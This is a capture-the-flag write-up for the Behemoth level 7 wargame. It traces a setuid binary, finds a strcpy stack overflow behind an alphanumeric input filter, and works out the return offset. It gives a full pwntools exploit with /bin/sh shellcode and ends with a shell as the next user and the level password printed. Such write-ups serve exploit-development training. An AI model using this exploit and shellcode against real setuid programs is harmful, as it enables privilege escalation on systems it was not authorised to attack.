My guess is that it is copying the contents of the enviroment variables.
```bash
behemoth7@behemoth:/behemoth$ ltrace ./behemoth7
__libc_start_main(0x804852b, 1, 0xffffd774, 0x8048650 <unfinished ...>
strlen("LC_ALL=en_US.UTF-8")                                                = 18
memset(0xffffd8a9, '\0', 18)                                                = 0xffffd8a9
strlen("LS_COLORS=rs=0:di=01;34:ln=01;36"...)                               = 1467
memset(0xffffd8bc, '\0', 1467)                                              = 0xffffd8bc
strlen("SSH_CONNECTION=95.76.16.246 5641"...)                               = 51
memset(0xffffde78, '\0', 51)                                                = 0xffffde78
strlen("LANG=en_US.UTF-8")                                                  = 16
memset(0xffffdeac, '\0', 16)                                                = 0xffffdeac
strlen("USER=behemoth7")                                                    = 14
memset(0xffffdebd, '\0', 14)                                                = 0xffffdebd
strlen("PWD=/behemoth")                                                     = 13
memset(0xffffdecc, '\0', 13)                                                = 0xffffdecc
strlen("HOME=/home/behemoth7")                                              = 20
memset(0xffffdeda, '\0', 20)                                                = 0xffffdeda
strlen("SSH_CLIENT=95.76.16.246 56412 22"...)                               = 32
memset(0xffffdeef, '\0', 32)                                                = 0xffffdeef
strlen("SSH_TTY=/dev/pts/1")                                                = 18
memset(0xffffdf10, '\0', 18)                                                = 0xffffdf10
strlen("MAIL=/var/mail/behemoth7")                                          = 24
memset(0xffffdf23, '\0', 24)                                                = 0xffffdf23
strlen("TERM=xterm-256color")                                               = 19
memset(0xffffdf3c, '\0', 19)                                                = 0xffffdf3c
strlen("SHELL=/bin/bash")                                                   = 15
memset(0xffffdf50, '\0', 15)                                                = 0xffffdf50
strlen("TMOUT=1800")                                                        = 10
memset(0xffffdf60, '\0', 10)                                                = 0xffffdf60
strlen("SHLVL=1")                                                           = 7
memset(0xffffdf6b, '\0', 7)                                                 = 0xffffdf6b
strlen("LOGNAME=behemoth7")                                                 = 17
memset(0xffffdf73, '\0', 17)                                                = 0xffffdf73
strlen("PATH=/usr/local/bin:/usr/bin:/bi"...)                               = 61
memset(0xffffdf85, '\0', 61)                                                = 0xffffdf85
strlen("_=/usr/bin/ltrace")                                                 = 17
memset(0xffffdfc3, '\0', 17)                                                = 0xffffdfc3
strlen("OLDPWD=/home/behemoth7")                                            = 22
memset(0xffffdfd5, '\0', 22)                                                = 0xffffdfd5
+++ exited (status 0) +++
```
*Strace* doesn't return anything that useful exept for the fact that it exits instead of returning.
```bash
behemoth7@behemoth:/behemoth$ strace ./behemoth7
execve("./behemoth7", ["./behemoth7"], [/* 18 vars */]) = 0
strace: [ Process PID=28030 runs in 32 bit mode. ]
brk(NULL)                               = 0x804a000
fcntl64(0, F_GETFD)                     = 0
fcntl64(1, F_GETFD)                     = 0
fcntl64(2, F_GETFD)                     = 0
access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xf7fd2000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=36357, ...}) = 0
mmap2(NULL, 36357, PROT_READ, MAP_PRIVATE, 3, 0) = 0xf7fc9000
close(3)                                = 0
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib32/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\1\1\1\3\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\0\204\1\0004\0\0\0"..., 512) = 512
fstat64(3, {st_mode=S_IFREG|0755, st_size=1787812, ...}) = 0
mmap2(NULL, 1796604, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xf7e12000
mmap2(0xf7fc3000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x1b0000) = 0xf7fc3000
mmap2(0xf7fc6000, 10748, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xf7fc6000
close(3)                                = 0
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xf7e10000
set_thread_area({entry_number:-1, base_addr:0xf7e10700, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0 (entry_number:12)
mprotect(0xf7fc3000, 8192, PROT_READ)   = 0
mprotect(0xf7ffc000, 4096, PROT_READ)   = 0
munmap(0xf7fc9000, 36357)               = 0
exit_group(0)                           = ?
+++ exited with 0 +++
```

Providing parameters seeems to yield a different result. We see a call to *strcpy()*, which in many cases is vulnerable to a buffer overflow.
```c
behemoth7@behemoth:/behemoth$ ltrace ./behemoth7 AAAAAAAAAAAA BBBBBBBBBBBB
__libc_start_main(0x804852b, 3, 0xffffd764, 0x8048650 <unfinished ...>
strlen("LC_ALL=en_US.UTF-8")                                                = 18
memset(0xffffd8a9, '\0', 18)                                                = 0xffffd8a9
strlen("LS_COLORS=rs=0:di=01;34:ln=01;36"...)                               = 1467
memset(0xffffd8bc, '\0', 1467)                                              = 0xffffd8bc
strlen("SSH_CONNECTION=95.76.16.246 5641"...)                               = 51
memset(0xffffde78, '\0', 51)                                                = 0xffffde78
strlen("LANG=en_US.UTF-8")                                                  = 16
memset(0xffffdeac, '\0', 16)                                                = 0xffffdeac
strlen("USER=behemoth7")                                                    = 14
memset(0xffffdebd, '\0', 14)                                                = 0xffffdebd
strlen("PWD=/behemoth")                                                     = 13
memset(0xffffdecc, '\0', 13)                                                = 0xffffdecc
strlen("HOME=/home/behemoth7")                                              = 20
memset(0xffffdeda, '\0', 20)                                                = 0xffffdeda
strlen("SSH_CLIENT=95.76.16.246 56412 22"...)                               = 32
memset(0xffffdeef, '\0', 32)                                                = 0xffffdeef
strlen("SSH_TTY=/dev/pts/1")                                                = 18
memset(0xffffdf10, '\0', 18)                                                = 0xffffdf10
strlen("MAIL=/var/mail/behemoth7")                                          = 24
memset(0xffffdf23, '\0', 24)                                                = 0xffffdf23
strlen("TERM=xterm-256color")                                               = 19
memset(0xffffdf3c, '\0', 19)                                                = 0xffffdf3c
strlen("SHELL=/bin/bash")                                                   = 15
memset(0xffffdf50, '\0', 15)                                                = 0xffffdf50
strlen("TMOUT=1800")                                                        = 10
memset(0xffffdf60, '\0', 10)                                                = 0xffffdf60
strlen("SHLVL=1")                                                           = 7
memset(0xffffdf6b, '\0', 7)                                                 = 0xffffdf6b
strlen("LOGNAME=behemoth7")                                                 = 17
memset(0xffffdf73, '\0', 17)                                                = 0xffffdf73
strlen("PATH=/usr/local/bin:/usr/bin:/bi"...)                               = 61
memset(0xffffdf85, '\0', 61)                                                = 0xffffdf85
strlen("_=/usr/bin/ltrace")                                                 = 17
memset(0xffffdfc3, '\0', 17)                                                = 0xffffdfc3
strlen("OLDPWD=/home/behemoth7")                                            = 22
memset(0xffffdfd5, '\0', 22)                                                = 0xffffdfd5
__ctype_b_loc()                                                             = 0xf7e106cc
__ctype_b_loc()                                                             = 0xf7e106cc
__ctype_b_loc()                                                             = 0xf7e106cc
__ctype_b_loc()                                                             = 0xf7e106cc
__ctype_b_loc()                                                             = 0xf7e106cc
__ctype_b_loc()                                                             = 0xf7e106cc
__ctype_b_loc()                                                             = 0xf7e106cc
__ctype_b_loc()                                                             = 0xf7e106cc
__ctype_b_loc()                                                             = 0xf7e106cc
__ctype_b_loc()                                                             = 0xf7e106cc
__ctype_b_loc()                                                             = 0xf7e106cc
__ctype_b_loc()                                                             = 0xf7e106cc
strcpy(0xffffd4bc, "AAAAAAAAAAAA")                                          = 0xffffd4bc
+++ exited (status 0) +++
```
```c
unsigned short int** __ctype_b_loc (void)
```
is a function which returns a pointer to a 'traits' table containing some flags related with the characteristics of each single character.
```bash
cat /usr/include/ctype.h | grep __ctype_b_loc -A 500
```

Here's the enum with the flags:
```c
From ctype.h
enum
{
  _ISupper = _ISbit (0),        /* UPPERCASE.  */
  _ISlower = _ISbit (1),        /* lowercase.  */
  _ISalpha = _ISbit (2),        /* Alphabetic.  */
  _ISdigit = _ISbit (3),        /* Numeric.  */
  _ISxdigit = _ISbit (4),       /* Hexadecimal numeric.  */
  _ISspace = _ISbit (5),        /* Whitespace.  */
  _ISprint = _ISbit (6),        /* Printing.  */
  _ISgraph = _ISbit (7),        /* Graphical.  */
  _ISblank = _ISbit (8),        /* Blank (usually SPC and TAB).  */
  _IScntrl = _ISbit (9),        /* Control character.  */
  _ISpunct = _ISbit (10),       /* Punctuation.  */
  _ISalnum = _ISbit (11)        /* Alphanumeric.  */
};
To make an example, if you make a lookup to the table __ctype_b_loc() returns for the character whose ascii code is 0x30 ('0') you will have 0x08d8
```
(https://braincoke.fr/blog/2018/05/what-is-ctype-b-loc/#about-__ctype_b_loc)[https://braincoke.fr/blog/2018/05/what-is-ctype-b-loc/#about-__ctype_b_loc]

From this article we understand that our program that does `and eax,0x400`, is checking to see if the character is alphanumeric.



It does seem to overflow after using a big amount of input.
```bash
behemoth7@behemoth:/behemoth$ ./behemoth7 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault
```
It is useful to see what protections are in place, considering the fact that we will probably exploit a buffer overflow. It seems there are none.
```bash
behemoth7@behemoth:/behemoth$ /usr/local/bin/checksec.sh --file ./behemoth7
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   ./behemoth7
```

Running *strings* reveals that something happens if we add format parameters.
```bash
behemoth7@behemoth:/behemoth$ strings behemoth7
.
.
.
alpha
Non-%s chars found in string, possible shellcode!
.
.
.
```

```bash
behemoth7@behemoth:/behemoth$ ./behemoth7 %x%s
Non-alpha chars found in string, possible shellcode!
behemoth7@behemoth:/behemoth$ ./behemoth7 %
Non-alpha chars found in string, possible shellcode!
behemoth7@behemoth:/behemoth$ ./behemoth7 '\$'
Non-alpha chars found in string, possible shellcode!
behemoth7@behemoth:/behemoth$ ./behemoth7 '#'
Non-alpha chars found in string, possible shellcode!
```
Analyzing the disassembly on paper, it looks like the program NULLS out envinroment variables and then a for loop over the string in argv[1].

It looks like the for loop on the string will make at most 0x1ff = 511 interations. We also break out of the for loop (presumably a for loop) if we encounter a null.

So, we can't use non-aphanumeric chars, and we have a buffer overflow, let's see what protections are enabled.



Quick and dirty offset find.
```bash
[*] Got EOF while sending in interactive
Trying offset 526
[+] Starting local process '/behemoth/behemoth7': pid 30028
[*] Switching to interactive mode
[*] Process '/behemoth/behemoth7' stopped with exit code 0 (pid 30028)
[*] Got EOF while reading in interactive
$ 
[*] Got EOF while sending in interactive
Trying offset 527
[+] Starting local process '/behemoth/behemoth7': pid 30032
[*] Switching to interactive mode
[*] Process '/behemoth/behemoth7' stopped with exit code 0 (pid 30032)
[*] Got EOF while reading in interactive
$ 
[*] Got EOF while sending in interactive
Trying offset 528
[+] Starting local process '/behemoth/behemoth7': pid 30036
[*] Switching to interactive mode
[*] Process '/behemoth/behemoth7' stopped with exit code -11 (SIGSEGV) (pid 30036)
[*] Got EOF while reading in interactive
$ 
[*] Got EOF while sending in interactive
Trying offset 529
[+] Starting local process '/behemoth/behemoth7': pid 30039
[*] Switching to interactive mode
[*] Process '/behemoth/behemoth7' stopped with exit code -11 (SIGSEGV) (pid 30039)
[*] Got EOF while reading in interactive
```

It looks like we have found our offset 528
```bash
Reading symbols from /behemoth/behemoth7...(no debugging symbols found)...done.
(gdb) r aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafAAAABBBB
Starting program: /behemoth/behemoth7 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafAAAABBBB

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
```
The binary has no protections against buffer overflow.
```bash
behemoth7@behemoth:/tmp/beh7me$ /usr/local/bin/checksec.sh --file /behemoth/behemoth7
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /behemoth/behemoth7
```

Put shellcode after the 500ish byte alphanumeric check, with NOPs before it.

```python
#!/usr/bin/python
import sys
from pwn import *

def main():
    if len(sys.argv) < 2:
        print("Usage <debug>")
        exit()
    debug = int(sys.argv[1], 10)
    shellcode = "\x31\xc9\xf7\xe9\x51\x04\x0b\xeb\x08\x5e\x87\xe6\x99\x87\xdc\xcd\x80\xe8\xf3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68"
    offset = 528
    aproximate_ret = 0xffffd28c+528
    for i in range(0, 512, 4):
        nop = 'AI'*32
        ret = p32(aproximate_ret + i)
        if '\x00' in ret:
            continue
        payload = cyclic(offset) + ret + nop + shellcode
        if(debug == 0):
            print("Trying offset " + str(i))
            p = process(['/behemoth/behemoth7', payload])
            print(payload)
            print(len(payload))
            p.interactive()
            p.close()
        else:
            print(payload)
            break

if __name__ == "__main__":
    main()
```

Some address where the string might be on the stack (0xffffd28c)

```bash
behemoth7@behemoth:/tmp/beh7me$ ./exp.py 0
Trying offset 0
[+] Starting local process '/behemoth/behemoth7': pid 25284
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaaf\x9c��\xffAIAIAIAIAIAIAIAIAIAIAIAIAIAIAIAIAIAIAIAIAIAIAIAIAIAIAIAIAIAIAIAI1���Q\x0b^\x87晇��\x80���\xff\xff/bin//sh
626
[*] Switching to interactive mode
$ whoami
behemoth8
$ cat /etc/behemoth_pass/behemoth7
cat: /etc/behemoth_pass/behemoth7: Permission denied
$ cat /etc/behemoth_pass/behemoth8
pheewij7Ae
```

## Behemoth 8

```bash
behemoth8@behemoth:~$ ls
CONGRATULATIONS
```